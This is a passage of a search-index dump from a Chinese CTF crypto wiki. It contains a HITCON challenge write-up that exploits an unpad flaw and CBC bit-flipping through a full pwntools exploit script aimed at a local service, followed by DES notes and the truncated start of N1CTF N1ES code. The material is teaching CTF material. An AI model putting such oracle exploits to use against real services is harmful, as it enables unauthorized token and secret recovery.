\u64cd\u4f5c\uff0c\u56e0\u6b64\u4e0a\u8ff0\u7684\u7206\u7834\u81ea\u7136\u4e0d\u53ef\u884c \u7a0b\u5e8f\u7684\u5927\u6982\u6d41\u7a0b\u5982\u4e0b \u7ecf\u8fc7 proof of work \u53d1\u9001 \u201cWelcome!!\u201d \u52a0\u5bc6\u540e\u7684\u6d88\u606f \u5728 340 \u6b21\u64cd\u4f5c\u4e2d\uff0c\u9700\u8981\u731c\u4e2d token \u7684\u503c\uff0c\u7136\u540e\u4f1a\u81ea\u52a8\u5c06 flag \u8f93\u51fa\u3002","title":"\u5206\u6790"},{"location":"crypto/blockcipher/block-cipher-mode/#_43","text":"\u5f53\u7136\uff0c\u5728\u4e0a\u4e2a\u9898\u76ee\u4e2d\u5b58\u5728\u7684\u6f0f\u6d1e\uff0c\u5728\u8fd9\u4e2a\u9898\u76ee\u4e2d\u4ecd\u7136\u5b58\u5728\uff0c\u5373 \u4efb\u610f\u6267\u884c\u7ed9\u5b9a\u547d\u4ee4 \u957f\u5ea6\u622a\u65ad","title":"\u6f0f\u6d1e"},{"location":"crypto/blockcipher/block-cipher-mode/#_44","text":"\u7531\u4e8e 340 \u7684\u6b21\u6570\u9650\u5236\uff0c\u867d\u7136\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u83b7\u5f97 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\uff08 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u90e8\u5206\u52a0\u5bc6\u540e\u6070\u597d\u662f 32 \u4e2a\u5b57\u8282\uff0c\u524d 16 \u4e2a\u5b57\u8282\u662f md5 \u540e\u52a0\u5bc6\u7684\u503c\uff0c\u540e\u9762\u7684 16 \u4e2a\u5b57\u8282\u5b8c\u5168\u662f\u586b\u5145\u7684\u52a0\u5bc6\u540e\u7684\u5b57\u8282\u3002 \u8fd9\u91cc md5(token[:i]) \u7279\u6307\u524d16\u4e2a\u5b57\u8282\u3002\uff09\u3002\u4f46\u662f\uff0c\u6211\u4eec\u4e0d\u80fd\u518d\u6b21\u4e3a\u4e86\u83b7\u5f97\u4e00\u4e2a\u5b57\u7b26\u53bb\u7206\u7834 256 \u6b21\u4e86\u3002 \u65e2\u7136\u4e0d\u80fd\u591f\u7206\u7834\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4e00\u6b21\u83b7\u53d6\u4e00\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\u5462\uff1f\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u6765\u68b3\u7406\u4e00\u4e0b\u8be5\u7a0b\u5e8f\u53ef\u80fd\u53ef\u4ee5\u6cc4\u6f0f\u7684\u4fe1\u606f \u67d0\u4e9b\u6d88\u606f\u7684 md5 \u503c\u52a0\u5bc6\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6 md5(token[:i]) \u52a0\u5bc6\u540e\u7684\u503c\u3002 unpad \u6bcf\u6b21\u4f1a\u5bf9\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u8fdb\u884c unpad\uff0c\u8fd9\u4e2a\u5b57\u8282\u662f\u6839\u636e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6765\u51b3\u5b9a\u7684\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd9\u4e2a\u5b57\u8282\u7684\u5927\u5c0f\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u80fd\u53ef\u4ee5\u77e5\u9053\u4e00\u4e2a\u5b57\u8282\u7684\u503c\u3002 \u8fd9\u91cc\u6211\u4eec\u6df1\u5165\u5206\u6790\u4e00\u4e0b unpad \u7684\u4fe1\u606f\u6cc4\u6f0f\u3002\u5982\u679c\u6211\u4eec\u5c06\u52a0\u5bc6 IV \u548c encrypt(md5(token[:i])) \u653e\u5728\u67d0\u4e2a\u5bc6\u6587 C \u7684\u540e\u9762\uff0c\u6784\u6210 C|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\u89e3\u5bc6\u51fa\u6765\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u5c31\u662f md5(token[:i]) \u3002\u8fdb\u800c\uff0c\u5728 unpad \u7684\u65f6\u5019\u5c31\u662f\u5229\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff08 0-255\uff09\u8fdb\u884c unpad\uff0c\u4e4b\u540e\u5bf9 unpad \u540e\u7684\u5b57\u7b26\u4e32\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4\uff08\u6bd4\u5982md5\uff09\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec \u4e8b\u5148\u6784\u9020\u4e00\u4e9b\u6d88\u606f\u54c8\u5e0c\u540e\u52a0\u5bc6\u7684\u6837\u672c \uff0c\u7136\u540e\u5c06\u4e0a\u8ff0\u6267\u884c\u540e\u7684\u7ed3\u679c\u4e0e\u6837\u672c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u57fa\u672c\u53ef\u4ee5\u786e\u5b9a md5(token[:i]) \u7684 \u6700\u540e\u4e00\u4e2a\u5b57\u8282 \u3002\u7136\u800c\uff0c\u5982\u679c md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e16\uff0c\u90a3\u4e48\u5728 unpad \u65f6\u5c31\u4f1a\u5229\u7528\u4e00\u4e9b md5 \u4e2d\u7684\u503c\uff0c\u800c\u8fd9\u90e8\u5206\u503c\uff0c\u7531\u4e8e\u5bf9\u4e8e\u4e0d\u540c\u957f\u5ea6\u7684 token[:i] \u51e0\u4e4e\u90fd\u4e0d\u4f1a\u76f8\u540c\u3002\u6240\u4ee5\u53ef\u80fd\u9700\u8981\u7279\u6b8a\u5904\u7406\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\uff0c\u5373\u751f\u6210\u4e0e unpad \u5b57\u8282\u5927\u5c0f\u5bf9\u5e94\u7684\u52a0\u5bc6\u7ed3\u679c\u6837\u672c\uff0c\u4ee5\u4fbf\u4e8e\u67e5\u8868\u3002 \u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work\u3002 \u83b7\u53d6 token \u52a0\u5bc6\u540e\u7684\u7ed3\u679c token_enc \uff0c\u8fd9\u91cc\u4f1a\u5728 token \u524d\u9762\u6dfb\u52a0 7 \u4e2a\u5b57\u8282 \"token: \" \u3002 \u56e0\u6b64\u52a0\u5bc6\u540e\u7684\u957f\u5ea6\u4e3a 64\u3002 \u4f9d\u6b21\u83b7\u53d6 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\uff0c\u4e00\u5171\u662f 57 \u4e2a\uff0c\u5305\u62ec\u6700\u540e\u4e00\u4e2a token \u7684 padding\u3002 \u6784\u9020\u4e0e unpad \u5927\u5c0f\u5bf9\u5e94\u7684\u6837\u672c\u3002\u8fd9\u91cc\u6211\u4eec\u6784\u9020\u5bc6\u6587 token_enc|padding|IV_indexi|welcome_enc \u3002\u7531\u4e8e IV_indexi \u662f\u4e3a\u4e86\u4fee\u6539\u6700\u540e\u4e00\u4e2a\u660e\u6587\u5757\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8be5\u5b57\u8282\u5904\u4e8e\u53d8\u5316\u4e4b\u4e2d\u3002\u6211\u4eec\u82e5\u60f3\u83b7\u53d6\u4e00\u4e9b\u56fa\u5b9a\u5b57\u8282\u7684\u54c8\u5e0c\u503c\uff0c\u8fd9\u90e8\u5206\u81ea\u7136\u4e0d\u80fd\u6dfb\u52a0\u3002\u56e0\u6b64\u8fd9\u91cc\u4ea7\u751f\u6837\u672c\u65f6 unpad \u7684\u5927\u5c0f\u8303\u56f4\u4e3a 17 ~ 255\u3002\u5982\u679c\u6700\u540e\u6d4b\u8bd5\u65f6 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c0f\u4e8e17\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u4f1a\u51fa\u73b0\u4e00\u4e9b\u672a\u77e5\u7684\u6837\u672c\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u662f\u6211\u4eec\u76f4\u63a5\u83b7\u53d6 255-17+1\u4e2a\u8fd9\u4e48\u591a\u4e2a\u6837\u672c\uff0c\u7136\u800c\uff0c\u5982\u679c\u8fd9\u6837\u505a\u7684\u8bdd\uff0c\u6839\u636e\u4e0a\u9762 340 \u7684\u6b21\u6570\uff08255-17+1+57+56>340\uff09\u9650\u5236\uff0c\u6211\u4eec\u663e\u7136\u4e0d\u80fd\u83b7\u53d6\u5230 token \u7684\u6240\u6709\u5b57\u8282\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u590d\u7528\u4e00\u4e9b\u5185\u5bb9\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u590d\u7528 encrypt(md5(token[:i])) \u7684\u7ed3\u679c\u3002\u90a3\u4e48\u6211\u4eec\u5728\u8865\u5145 padding \u65f6\u9700\u8981\u786e\u4fdd\u4e00\u65b9\u9762\u6b21\u6570\u591f\u7528\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u7ed3\u679c\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e unpad \u7684\u5faa\u73af\u4e3a 17 \u5230 208\uff0c\u5e76\u4f7f\u5f97 unpad \u5927\u4e8e 208 \u65f6\u6070\u597d unpad \u5230\u6211\u4eec\u53ef\u4ee5\u590d\u7528\u7684\u5730\u65b9\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f53 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a 0 \u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u89e3\u5bc6\u540e\u7684\u660e\u6587 unpad \u6389\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 command not found \u7684\u5bc6\u6587\u3002 \u518d\u6b21\u6784\u9020\u5bc6\u6587 token_enc|padding|IV|encrypt(md5(token[:i])) \uff0c\u90a3\u4e48\uff0c\u89e3\u5bc6\u65f6\u5373\u4f7f\u7528 md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8fdb\u884c unpad\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u4e0d\u5c0f\u4e8e17\u6216\u8005\u4e3a0\uff0c\u5219\u53ef\u4ee5\u5904\u7406\u3002\u5982\u679c\u8fd9\u4e2a\u5b57\u8282\u5c0f\u4e8e17\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u6700\u540e\u8fd4\u56de\u7ed9\u7528\u6237\u7684 md5 \u7684\u7ed3\u679c\u5e76\u4e0d\u5728\u6837\u672c\u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6211\u4eec\u4fee\u6539\u5176\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u6700\u9ad8\u6bd4\u7279\u4f4d\uff0c\u4f7f\u5176 unpad \u540e\u53ef\u4ee5\u843d\u5728\u6837\u672c\u8303\u56f4\u5185\u3002\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002 \u5728\u731c\u51fa md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u66b4\u529b\u7834\u89e3 256 \u6b21\uff0c\u627e\u51fa\u6240\u6709\u54c8\u5e0c\u503c\u672b\u5c3e\u4e3a md5(token[:i]) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u3002 \u4f46\u662f\uff0c\u5728\u7b2c\u516d\u6b65\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a md5(token[:i]) \u53ef\u80fd\u4f1a\u627e\u51fa\u591a\u4e2a\u5907\u9009\u5b57\u7b26\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u4f7f\u5f97\u5176\u672b\u5c3e\u5b57\u8282\u662f\u7ed9\u5b9a\u5b57\u8282\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5982\u4f55\u5220\u9664\u4e00\u4e9b\u591a\u4f59\u7684\u5907\u9009\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u91cc\u6211\u5c31\u9009\u62e9\u4e86\u4e00\u4e2a\u5c0f trick\uff0c\u5373\u5728\u9010\u5b57\u8282\u679a\u4e3e\u65f6\uff0c\u540c\u65f6\u679a\u4e3e\u51fa token \u7684 padding\u3002\u7531\u4e8e padding \u662f 0x01 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8fc7\u6ee4\u51fa\u6240\u6709\u7ed3\u5c3e\u4e0d\u662f 0x01 \u7684token \u5373\u53ef\u3002 \u8fd9\u91cc\uff0c\u5728\u6d4b\u8bd5\u65f6\uff0c\u5c06\u4ee3\u7801\u4e2d sleep \u6ce8\u91ca\u6389\u4e86\u3002\u4ee5\u4fbf\u4e8e\u52a0\u5feb\u4ea4\u4e92\u901f\u5ea6\u3002\u5229\u7528\u4ee3\u7801\u5982\u4e0b from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # remove pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) def sendmsg ( iv , cipher ): payload = iv + cipher payload = base64 . b64encode ( payload ) p . sendline ( payload ) def recvmsg (): data = p . recvuntil ( \" \\n \" , drop = True ) data = base64 . b64decode ( data ) return data [: 16 ], data [ 16 :] def getmd5enc ( i , cipher_token , cipher_welcome , iv ): \"\"\"return encrypt( md5( token[:i+1] ) )\"\"\" ## keep iv[7:] do not change, so decrypt msg[7:] won't change get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv ) payload = cipher_token ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_token ) + 16 + 16 - ( 7 + i + 1 )), iv ) payload += last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , payload ) return recvmsg () def get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ): md5_token_idxi = [] for i in range ( len ( cipher_token ) - 7 ): log . info ( \"idx i: {}\" . format ( i )) _ , md5_indexi = getmd5enc ( i , cipher_token , cipher_welcome , iv_encrypt ) assert ( len ( md5_indexi ) == 32 ) # remove the last 16 byte for padding md5_token_idxi . append ( md5_indexi [: 16 ]) return md5_token_idxi def doin ( unpadcipher , md5map , candidates , flag ): if unpadcipher in md5map : lastbyte = md5map [ unpadcipher ] else : lastbyte = 0 if flag == 0 : lastbyte ^= 0x80 newcandidates = [] for x in candidates : for c in range ( 256 ): if MD5 . new ( x + chr ( c )) . digest ()[ - 1 ] == chr ( lastbyte ): newcandidates . append ( x + chr ( c )) candidates = newcandidates print candidates return candidates def main (): bypassproof () # result of encrypted Welcome!! iv_encrypt , cipher_welcome = recvmsg () log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-token get_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-token\" ), iv_encrypt ) sendmsg ( get_token_iv , cipher_welcome ) _ , cipher_token = recvmsg () token_len = len ( cipher_token ) log . info ( \"cipher token is : \" + cipher_token ) # get command not found cipher sendmsg ( iv_encrypt , cipher_welcome ) _ , cipher_notfound = recvmsg () # get encrypted(token[:i+1]),57 times md5_token_idx_list = get_md5_token_indexi ( iv_encrypt , cipher_welcome , cipher_token ) # get md5map for each unpadsize, 209-17 times # when upadsize>208, it will unpad ciphertoken # then we can reuse md5map = dict () for unpadsize in range ( 17 , 209 ): log . info ( \"get unpad size {} cipher\" . format ( unpadsize )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" ## calculate the proper last byte number, only change the last byte ## set last_byte_iv = iv_encrypted[:15] | proper byte last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"Welcome!!\" )[: 15 ] + chr ( unpadsize ), iv_encrypt ) cipher = cipher_token + padding + last_byte_iv + cipher_welcome sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () md5map [ unpadcipher ] = unpadsize # reuse encrypted(token[:i+1]) for i in range ( 209 , 256 ): target = md5_token_idx_list [ 56 - ( i - 209 )] md5map [ target ] = i candidates = [ \"\" ] # get the byte token[i], only 56 byte for i in range ( token_len - 7 ): log . info ( \"get token[{}]\" . format ( i )) get_md5_iv = flipplain ( \"token: \" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) ## padding 16*11 bytes padding = 16 * 11 * \"a\" cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list [ i ] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () # already in or md5[token[:i]][-1]='\\x00' if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 1 ) else : log . info ( \"unpad size 1-16\" ) # flip most significant bit of last byte to move it in a good range cipher = cipher [: - 17 ] + strxor ( cipher [ - 17 ], ' \\x80 ' ) + cipher [ - 16 :] sendmsg ( get_md5_iv , cipher ) _ , unpadcipher = recvmsg () if unpadcipher in md5map or unpadcipher == cipher_notfound : candidates = doin ( unpadcipher , md5map , candidates , 0 ) else : log . info ( 'oh my god,,,, it must be in...' ) exit () print len ( candidates ) # padding 0x01 candidates = filter ( lambda x : x [ - 1 ] == chr ( 0x01 ), candidates ) # only 56 bytes candidates = [ x [: - 1 ] for x in candidates ] print len ( candidates ) assert ( len ( candidates [ 0 ]) == 56 ) # check-token check_token_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"check-token\" ), iv_encrypt ) sendmsg ( check_token_iv , cipher_welcome ) p . recvuntil ( \"Give me the token! \\n \" ) p . sendline ( base64 . b64encode ( candidates [ 0 ])) print p . recv () p . interactive () if __name__ == \"__main__\" : main () \u6548\u679c\u5982\u4e0b ... 79 1 hitcon { uNp@d_M3th0D_i5_am4Z1n9! }","title":"\u5229\u7528\u601d\u8def"},{"location":"crypto/blockcipher/block-cipher-mode/#_45","text":"\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f https://en.wikipedia.org/wiki/Padding_oracle_attack http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf https://ctftime.org/writeup/7975 https://ctftime.org/writeup/7974 \u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/blockcipher/des/","text":"DES \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Data Encryption Standard(DES)\uff0c\u6570\u636e\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165 64 \u4f4d\u3002 \u8f93\u51fa 64 \u4f4d\u3002 \u5bc6\u94a5 64 \u4f4d\uff0c\u4f7f\u7528 64 \u4f4d\u5bc6\u94a5\u4e2d\u7684 56 \u4f4d\uff0c\u5269\u4f59\u7684 8 \u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u3002 Feistel \u8fed\u4ee3\u7ed3\u6784 \u660e\u6587\u7ecf\u8fc7 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002 \u5bc6\u6587\u7ecf\u8fc7\u7c7b\u4f3c\u7684 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u660e\u6587\u3002 \u57fa\u672c\u6d41\u7a0b \u00b6 \u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe \u3002 \u52a0\u5bc6 \u00b6 \u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) \u90a3\u4e48\u5728\u6700\u540e\u7684 Permutation \u4e4b\u524d\uff0c\u5bf9\u5e94\u7684\u5bc6\u6587\u4e3a (R_{n+1},L_{n+1}) (R_{n+1},L_{n+1}) \u3002 \u89e3\u5bc6 \u00b6 \u90a3\u4e48\u89e3\u5bc6\u5982\u4f55\u89e3\u5bc6\u5462\uff1f\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u628a\u5bc6\u6587\u5148\u8fdb\u884c\u9006\u7f6e\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u4e00\u8f6e\u7684\u8f93\u51fa\u3002\u6211\u4eec\u8fd9\u65f6\u8003\u8651\u6bcf\u4e00\u8f6e R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) \u56e0\u6b64\uff0c (L_0,R_0) (L_0,R_0) \u5c31\u662f\u52a0\u5bc6\u65f6\u7b2c\u4e00\u6b21\u7f6e\u6362\u540e\u7684\u660e\u6587\u3002\u6211\u4eec\u53ea\u9700\u8981\u518d\u6267\u884c\u9006\u7f6e\u6362\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u4e86\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cDES \u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u5957\u903b\u8f91\uff0c\u53ea\u662f\u5bc6\u94a5\u4f7f\u7528\u7684\u987a\u5e8f\u4e0d\u4e00\u81f4\u3002 \u6838\u5fc3\u90e8\u4ef6 \u00b6 DES \u4e2d\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3b\u8981\u5305\u62ec\uff08\u8fd9\u91cc\u53ea\u7ed9\u51fa\u52a0\u5bc6\u8fc7\u7a0b\u7684\uff09 \u521d\u59cb\u7f6e\u6362 F \u51fd\u6570 E \u6269\u5c55\u51fd\u6570 S \u76d2\uff0c\u8bbe\u8ba1\u6807\u51c6\u672a\u7ed9\u51fa\u3002 P \u7f6e\u6362 \u6700\u540e\u7f6e\u6362 \u5176\u4e2d F \u51fd\u6570\u5982\u4e0b \u5982\u679c\u5bf9 DES \u66f4\u52a0\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u4ed4\u7ec6\u5730\u7814\u7a76\u3002\u6b22\u8fce\u63d0\u4f9b PR\u3002 \u884d\u751f \u00b6 \u5728 DES \u7684\u57fa\u7840\u4e0a\uff0c\u884d\u751f\u4e86\u4ee5\u4e0b\u4e24\u79cd\u52a0\u5bc6\u65b9\u5f0f \u53cc\u91cd DES \u4e09\u79cd DES \u53cc\u91cd DES \u00b6 \u53cc\u91cd DES \u4f7f\u7528\u4e24\u4e2a\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 112 \u6bd4\u7279\u3002\u52a0\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k2}(E_{k1}(P)) C=E_{k2}(E_{k1}(P)) \u4f46\u662f\u53cc\u91cd DES \u4e0d\u80fd\u62b5\u6297\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u4e24\u4e2a\u96c6\u5408 I={E_{k1}(P)} I={E_{k1}(P)} J=D_{k2}(C) J=D_{k2}(C) \u5373\u5206\u522b\u679a\u4e3e K1 \u548c K2 \u5206\u522b\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u548c\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u3002 \u5728\u6211\u4eec\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u5b8c\u6bd5\u540e\uff0c\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u6837\u7684\u590d\u6742\u5ea6\u4e3a 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) \u5f53\u6211\u4eec\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u65f6\uff0c\u53ef\u4ee5\u6bcf\u89e3\u5bc6\u4e00\u4e2a\uff0c\u5c31\u53bb\u5bf9\u5e94\u7684\u8868\u4e2d\u67e5\u8be2\u3002 \u603b\u7684\u590d\u6742\u5ea6\u4e3a\u8fd8\u662f O(n2^n) O(n2^n) \u3002 \u4e09\u91cd DES \u00b6 \u4e09\u91cd DES \u7684\u52a0\u89e3\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) \u5728\u9009\u62e9\u5bc6\u94a5\u65f6\uff0c\u53ef\u4ee5\u6709\u4e24\u79cd\u65b9\u6cd5 3 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1\uff0ck2\uff0ck3 \u4e92\u76f8\u72ec\u7acb\uff0c\u4e00\u5171 168 \u6bd4\u7279\u3002 2 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1 \u4e0e k2 \u72ec\u7acb\uff0ck3=k1\uff0c112 \u6bd4\u7279\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u5dee\u5206\u653b\u51fb \u7ebf\u6027\u653b\u51fb 2018 N1CTF N1ES \u00b6 \u57fa\u672c\u4ee3\u7801\u5982\u4e0b # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) res = '' for i in range ( len ( a )): res += chr ( f ( ord ( a [ i ]), ord ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l pos = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 pos += 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 